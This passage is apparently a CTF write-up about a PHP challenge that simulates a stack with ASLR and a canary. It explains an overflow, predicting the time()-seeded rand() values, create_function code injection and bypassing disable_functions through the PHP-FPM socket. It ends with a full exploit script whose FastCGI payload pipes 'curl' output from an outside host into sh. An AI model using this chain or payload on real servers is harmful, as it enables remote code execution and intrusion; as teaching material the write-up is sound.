    'esp'=>0x0,
    'eip'=>0x0,
);


function aslr(&$O00,$O0O)
{
    $O00 = $O00 + 0x60000000 + INS_OFFSET + 0x001 ;

}
$func_ = array_flip($func);
array_walk($func_,'aslr');
$plt = array_flip($func_);


function handle_data($OOO){
    $O000 = strlen($OOO);

    $O00O = $O000/0x000004+(0x001*($O000%0x000004));

    $O0O0 = str_split($OOO,0x000004);

    $O0O0[$O00O-0x001] = str_pad($O0O0[$O00O-0x001],0x000004,"\x00");

    foreach ($O0O0  as  $O0OO=>&$OO00){
        $OO00 = strrev(bin2hex($OO00));

    }
    return $O0O0;

}

function gen_canary(){
    $OOOO = 'abcdefghijklmnopqrstuvwxyzABCDEFGHJKLMNPQEST123456789';

    $O0000 = $OOOO[rand(0,strlen($OOOO)-0x001)];

    $O000O = $OOOO[rand(0,strlen($OOOO)-0x001)];

    $O00O0 = $OOOO[rand(0,strlen($OOOO)-0x001)];

    $O00OO = "\x00";

    return handle_data($O0000.$O000O.$O00O0.$O00OO)[0];

}
$canary = gen_canary();
$canarycheck = $canary;

function check_canary(){
    global $canary;

    global $canarycheck;

    if($canary != $canarycheck){
        die('emmmmmm...Don\'t attack me!');
    }

}

Class O0OO0{
    private  $ebp,$stack,$esp;

    public  function __construct($O0OOO,$OO000) {
        $this->stack = array();

        global $regs;

        $this->ebp = &$regs['ebp'];

        $this->esp = &$regs['esp'];

        $this->ebp = 0xfffe0000 + rand(0x0000,0xffff);

        global $canary;

        $this->stack[$this->ebp - 0x4] = &$canary;

        $this->stack[$this->ebp] = $this->ebp + rand(0x0000,0xffff);

        $this->esp = $this->ebp - (rand(0x20,0x60)*0x000004);

        $this->stack[$this->ebp + 0x4] = dechex($O0OOO);

        if($OO000 != NULL)
            $this->{'pushdata'}($OO000);
    }

    public  function pushdata($OO0O0){
        $OO0O0 = handle_data($OO0O0);

        for($OO0OO=0;$OO0OO<count($OO0O0);$OO0OO++){
            $this->stack[$this->esp+($OO0OO*0x000004)] = $OO0O0[$OO0OO];//no args in my stack haha
            check_canary();

        }
    }

    public  function recover_data($OOO0O){

        return hex2bin(strrev($OOO0O));

    }


    public  function outputdata(){
        global $regs;

        echo 'root says: ';

        while(0x001){
            if($this->esp == $this->ebp-0x4)
                break;
            $this->{'pop'}('eax');

            $OOOOO = $this->{'recover_data'}($regs['eax']);

            $O00000 = explode("\x00",$OOOOO);

            echo $O00000[0];

            if(count($O00000)>0x001){
                break;
            }
        }

    }
    public  function ret(){

        $this->esp = $this->ebp;

        $this->{'pop'}('ebp');

        $this->{'pop'}('eip');

        $this->{'call'}();

    }

    public  function get_data_from_reg($O000OO){
        global $regs;

        $O00O00 = $this->{'recover_data'}($regs[$O000OO]);

        $O00O0O = explode("\x00",$O00O00);

        return $O00O0O[0];

    }

    public  function call()
    {
        global $regs;

        global $plt;

        $O00OOO = hexdec($regs['eip']);

        if(isset($_REQUEST[$O00OOO])) {
            $this->{'pop'}('eax');
            $O0O000 = (int)$this->{'get_data_from_reg'}('eax');
            $O0O00O = array();
            for($O0O0O0=0;$O0O0O0<$O0O000;$O0O0O0++){
                $this->{'pop'}('eax');
                $O0O0OO = $this->{'get_data_from_reg'}('eax');
                array_push($O0O00O,$_REQUEST[$O0O0OO]);
            }
            call_user_func_array($plt[$O00OOO],$O0O00O);
        }
        else {
            call_user_func($plt[$O00OOO]);
        }

    }

    public  function push($O0OO0O){
        global $regs;

        $O0OOO0 = $regs[$O0OO0O];

        if( hex2bin(strrev($O0OOO0)) == NULL ) die('data error');
        $this->stack[$this->esp] = $O0OOO0;

        $this->esp -= 0x000004;

    }

    public  function pop($OO0000){
        global $regs;

        $regs[$OO0000] = $this->stack[$this->esp];

        $this->esp += 0x000004;


    }

    public  function __call($OO000O,$OO00O0)
    {
        check_canary();

    }

}class_alias('O0OO0','stack',0);print_R('O0OO0');print_R('stack');

if(isset($_POST['data'])) {
        $phpinfo_addr = array_search('phpinfo', $plt);
        $gets = $_POST['data'];
        $main_stack = new stack($phpinfo_addr, $gets);
        echo '--------------------output---------------------</br></br>';
        $main_stack->{'outputdata'}();
        echo '</br></br>------------------phpinfo()------------------</br>';
        $main_stack->{'ret'}();
}


```

Now the source code is readable. And We can see  it simulated a [stack implementation](https://en.wikipedia.org/wiki/Call_stack) .

#### Some simulated things

##### regs
```php
$regs = array(
    'eax'=>0x0,
    'ebp'=>0x0,
    'esp'=>0x0,
    'eip'=>0x0,
);
```
##### aslr
[aslr](https://en.wikipedia.org/wiki/Address_space_layout_randomization)

```php
define('INS_OFFSET',rand(0x0000,0xffff));

function aslr(&$O00,$O0O)
{
    $O00 = $O00 + 0x60000000 + INS_OFFSET + 0x001 ;

}
```
##### .plt
[.plt](https://www.google.com.hk/search?q=Procedure+Linkage+Table)
```php
//sandbox.php
$func = get_defined_functions()["internal"];
//index.php
$func_ = array_flip($func);
array_walk($func_,'aslr');
$plt = array_flip($func_);
```
##### canary protection

[canary](https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries)
```php
function gen_canary(){$O0O00=&$GLOBALS{O0};
    $OOOO = 'abcdefghijklmnopqrstuvwxyzABCDEFGHJKLMNPQEST123456789';

    $O0000 = $OOOO[rand(0,strlen($OOOO)-0x001)];

    $O000O = $OOOO[rand(0,strlen($OOOO)-0x001)];

    $O00O0 = $OOOO[rand(0,strlen($OOOO)-0x001)];

    $O00OO = "\x00";

    return handle_data($O0000.$O000O.$O00O0.$O00OO)[0];

}
$canary = gen_canary();
$canarycheck = $canary;

function check_canary(){
    global $canary;

    global $canarycheck;

    if($canary != $canarycheck){
        die('emmmmmm...Don\'t attack me!');
    }

}

...

Class stack { 
     ...
     public function __call($OO000O,$OO00O0)
    {
        check_canary();

    }
}
```
##### Some instructions
###### push
push data into `stack` from `$reg`
```php
public  function push($O0OO0O){
        global $regs;

        $O0OOO0 = $regs[$O0OO0O];

        if( hex2bin(strrev($O0OOO0)) == NULL ) die('data error');
        $this->stack[$this->esp] = $O0OOO0;

        $this->esp -= 0x000004;

    }
```
###### pop

pop data into `$reg` from `stack`
```php
public  function pop($OO0000){
        global $regs;

        $regs[$OO0000] = $this->stack[$this->esp];

        $this->esp += 0x000004;


    }
```
###### ret
pop `eip` and call it.

```php
public  function ret(){$O000O0=&$GLOBALS{O0};

        $this->esp = $this->ebp;

        $this->{'pop'}('ebp');

        $this->{'pop'}('eip');

        $this->{'call'}();

    }
```
###### call

Call the function which address equal to the address in `$regs['eip']`,if `$_REQUEST[$regs['eip']]` is not null, it will `pop`  data in stack to `eax`, and pass them as arguments to the function.
```php
 public  function call()
    {
        global $regs;

        global $plt;

        $O00OOO = hexdec($regs['eip']);//function addr

        if(isset($_REQUEST[$O00OOO])) {
            $this->{'pop'}('eax');
            $O0O000 = (int)$this->{'get_data_from_reg'}('eax');//arguments number
            $O0O00O = array();
            for($O0O0O0=0;$O0O0O0<$O0O000;$O0O0O0++){
                $this->{'pop'}('eax');
                $O0O0OO = $this->{'get_data_from_reg'}('eax');
                array_push($O0O00O,$_REQUEST[$O0O0OO]);
            }
            call_user_func_array($plt[$O00OOO],$O0O00O);
        }
        else {
            call_user_func($plt[$O00OOO]);
        }

    }
```
#### "stack" overflow

The stack's size is `(rand(0x20,0x60)*0x000004)`, and there is [canary protection](https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries) in "stack" (`$this->stack[$this->ebp - 0x4]`)
```php
...

$this->stack[$this->ebp - 0x4] = &$canary;

$this->stack[$this->ebp] = $this->ebp + rand(0x0000,0xffff);

$this->esp = $this->ebp - (rand(0x20,0x60)*0x000004);//esp

//$OO000 is the .plt address of phpinfo()
$this->stack[$this->ebp + 0x4] = dechex($O0OOO);//ret addr

//$OO000 is $_POST['data']
if($OO000 != NULL)
    $this->{'pushdata'}($OO000);
...
```

We can see the function `pushdata()` doesn't check the length of input strings.

```php
public function pushdata($OO0O0){$OOO00=&$GLOBALS{O0};
        $OO0O0 = handle_data($OO0O0);

        for($OO0OO=0;$OO0OO<count($OO0O0);$OO0OO++){
            $this->stack[$this->esp+($OO0OO*0x000004)] = $OO0O0[$OO0OO];//no args in my stack haha
            check_canary();

        }
    }
```

So we can push a long-length data into stack and it will cover the `canary`, `ebp`,`ret addr` and so on. When `ret()` is called, our fake `ret addr` will `pop` to `eip`, the function in the address will be excuted through `call_user_func_array()` / `call_user_func()`.

But the `address` is protected by `ASLR`,  `stack` is protected by `canary`. How to solve it?

##### Bypass ASLR and Canary

We can see all the protections are related with `rand()`, and the seed is `time()`.

```php
$seed = time();
srand($seed);
```
So we can get the timestamp in `phpinfo()`, and calculate these random numbers locally, all the protections are useless now .


##### Convert arbitrary function execution to arbitrary code execution

Using the `Dockerfile`, we can build an environment similar to the challenge, easily to get the order of functions in  `.plt`.
Now we can excute arbitrary function in `.plt`.

In order to make it easier to bypass `disable_functions` and `open_basedir`, we need to convert arbitrary function execution to arbitrary code execution.

In `PHP7`, `assert` is disabled in `call_user_func`, but we can inject PHP code into `create_function()`.
```php
create_function('','}phpinfo();//');
```
https://github.com/php/php-src/blob/PHP-7.3.5/Zend/zend_builtin_functions.c#L1938

##### Bypass disable_functions and open_basedir


Dockerfile
```dockerfile
...

RUN apt-cache search "php" | grep "php7.3"| awk '{print $1}'| xargs apt-get -y install
RUN service --status-all | awk '{print $4}'| xargs -i service {} stop
...
COPY ./php.ini /etc/php/7.3/apache2/php.ini
...
CMD ["/run.sh"]
```
run.sh

```shell
#!/bin/sh

service --status-all | awk '{print $4}'| xargs  -i service {} start

sleep infinity;
```
If you build a docker using files above, it will install&start `PHP-FPM` service.

`php.ini` with sandbox protection is only worked with `apache2`.

So you can use `stream_socket_client` and `stream_socket_sendto` connetting to `PHP-FPM` service.

https://bugs.php.net/bug.php?id=70134

##### exploit

To make it easier to understand, I use the source code without confusion.

```php
<?php

$exp = "";
$seed = time();

srand($seed);
define("INS_OFFSET",rand(0x0000,0xffff));

$regs = array(
    'eax'=>0x0,
    'ebp'=>0x0,
    'esp'=>0x0,
    'eip'=>0x0,
);

$func = get_defined_functions()["internal"];

function aslr(&$value,$key)
{
    $value = $value + 0x60000000 + INS_OFFSET + 1 ;
}
$func_ = array_flip($func);
array_walk($func_,"aslr");
$plt = array_flip($func_);


function handle_data($data){
    $data_len = strlen($data);
    $bytes4_size = $data_len/4+(1*($data_len%4));
    $cut_data = str_split($data,4);
    $cut_data[$bytes4_size-1] = str_pad($cut_data[$bytes4_size-1],4,"\x00");
    foreach ($cut_data as $key=>&$value){
        $value = strrev(bin2hex($value));
    }
    return $cut_data;
}

function gen_canary(){
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHJKLMNPQEST123456789';
    $c_1 = $chars[rand(0,strlen($chars)-1)];
    $c_2 = $chars[rand(0,strlen($chars)-1)];
    $c_3 = $chars[rand(0,strlen($chars)-1)];
    $c_4 = "\x00";
    return handle_data($c_1.$c_2.$c_3.$c_4)[0];
}
$canary = gen_canary();
echo $canary;
$canarycheck = $canary;

function check_canary(){
    global $canary;
    global $canarycheck;
    if($canary != $canarycheck){
        die("emmmmmm...Don't attack me!");
    }

}

Class stack{
    private $ebp,$stack,$esp;

    public function __construct($retaddr,$data) {
        $this->stack = array();
        global $regs;
        $this->ebp = &$regs['ebp'];
        $this->esp = &$regs['esp'];
        $this->ebp = 0xfffe0000 + rand(0x0000,0xffff);
        global $canary;
        $this->stack[$this->ebp - 0x4] = &$canary;
        $this->stack[$this->ebp] = $this->ebp + rand(0x0000,0xffff);
        $this->esp = $this->ebp - (rand(0x20,0x60)*4);
        global $exp;
        global $canarycheck;

        $exp = str_repeat('AAAA',(($this->ebp-$this->esp)/4)-1).hex2bin(strrev($canarycheck));
        echo bin2hex($exp);
        
        $this->stack[$this->ebp + 0x4] = dechex($retaddr);
        if($data != NULL)
            $this->pushdata($data);
    }

    public function pushdata($data){
        $data = handle_data($data);
        for($i=0;$i<count($data);$i++){
            $this->stack[$this->esp+($i*4)] = $data[$i];//no args in my stack haha
            check_canary();
        }
    }

    public function recover_data($data){

        return hex2bin(strrev($data));

    }
    public function outputdata(){
        global $regs;
        while(1){
            if($this->esp == $this->ebp-0x4)
                break;
            $this->pop("eax");
            $data = $this->recover_data($regs["eax"]);
            $tmp = explode("\x00",$data);
            echo $tmp[0];
            if(count($tmp)>1){
                break;
            }
        }

    }
    public function ret(){
        $this->esp = $this->ebp + 0x4;
        $this->pop("eip");
        $this->call();
    }

    public function call()
    {
        global $regs;
        global $plt;
        $funcaddr = hexdec($regs['eip']);
        if(isset($_REQUEST[$funcaddr])) {
            call_user_func($plt[$funcaddr],$_REQUEST[$funcaddr]);
        }
        else
        {
            call_user_func($plt[$funcaddr]);
        }

    }

    public function push($reg){
        global $regs;
        $reg_data = $regs[$reg];
        if( hex2bin(strrev($reg_data)) == NULL ) die("data error");
        $this->stack[$this->esp] = $reg_data;
        $this->esp -= 4;
    }

    public function pop($reg){
        global $regs;
        $regs[$reg] = $this->stack[$this->esp];
        $this->esp += 4;

    }

    public function __call($_a1,$_a2)
    {
        check_canary();
    }

}


        $phpinfo_addr = array_search('phpinfo', $plt);
        $pltbase = $phpinfo_addr - array_search('phpinfo', $func);
        $create_function = dechex($pltbase + 41);//create_function
        $gets = "aaa";
        $main_stack = new stack($phpinfo_addr, $gets);
        $exp = $exp."BBBB".hex2bin(strrev($create_function))."0002"."arg1"."arg2";
        echo "<br>myseed:".(string)$seed."<br>";
        $curl = curl_init();
    	curl_setopt($curl, CURLOPT_URL, 'http://34.92.25.123:10080/');
    	curl_setopt($curl, CURLOPT_HEADER, 1);
    	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);                            
    	curl_setopt($curl, CURLOPT_POST, 1);
    	$post_data = array(
        	"data" => $exp,
        	(string)($pltbase+41)=>'a',
            "arg1" => "",                
            "arg2" => '}echo "pwned<br>";$fp = stream_socket_client("unix:///run/php/php7.3-fpm.sock", $errno, $errstr,30);$out = urldecode("%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH92%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%5C%04%00%3C%3Fphp%20system%28%27curl%20http%3A//ebcece08.w1n.pw/getflag%20%7C%20sh%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00");stream_socket_sendto($fp,$out);while (!feof($fp)) {echo htmlspecialchars(fgets($fp, 10)); }fclose($fp);//'
        );


    curl_setopt($curl, CURLOPT_POSTFIELDS, $post_data);
    $data = curl_exec($curl);
    curl_close($curl);
    echo($data);

?>

```




